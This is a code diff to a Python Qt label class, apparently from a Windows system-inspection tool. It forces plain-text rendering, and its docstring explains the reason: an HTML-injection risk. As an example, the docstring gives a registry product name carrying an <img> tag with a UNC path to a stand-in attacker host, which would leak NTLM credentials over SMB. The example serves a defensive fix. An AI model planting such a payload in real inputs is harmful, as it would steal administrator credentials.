@@ -35,11 +35,36 @@ from .theme import Mode, Pair, space
 # --------------------------------------------------------------------------
 
 class Text(QLabel):
-    """A label that knows which type role and colour token it is."""
+    """A label that knows which type role and colour token it is.
+
+    Always plain text, never rich text, and that line is load-bearing.
+
+    QLabel defaults to ``TextFormat.AutoText``, which guesses - and guesses
+    "this is HTML" for anything with a tag in it. Nearly everything this
+    application displays came off the machine it is inspecting: product names
+    out of the registry, service display names, file paths, and the model's own
+    output. Those are strings somebody else chose, and one of the registry keys
+    they come from is under HKCU, which the logged-in user can write without a
+    UAC prompt.
+
+    Left on AutoText, a product called
+    ``Acme Reader <img src="\\\\attacker.example\\s\\a.png">`` does two
+    things when the Exposure page lists it. The tags are swallowed, so the
+    operator reads "Acme Reader" and never sees the payload - the subject of
+    the report editing the report. And Qt resolves that image resource, which
+    on Windows opens an SMB session to the attacker's host from a process
+    running as administrator, handing over an NTLM authentication of that
+    account.
+
+    The terminal side of this was fixed by stripping control sequences. This
+    is the same bug wearing a toolkit, and one call closes it for every label
+    in the application, because this is the only label class.
+    """
 
     def __init__(self, text: str = "", role: str = "body", colour: Pair | None = None,
                  mode: Mode = Mode.LIGHT, wrap: bool = False, parent=None) -> None:
         super().__init__(text, parent)
+        self.setTextFormat(Qt.TextFormat.PlainText)
         self._role = role
         self._colour = colour or theme.INK
         self.setWordWrap(wrap)
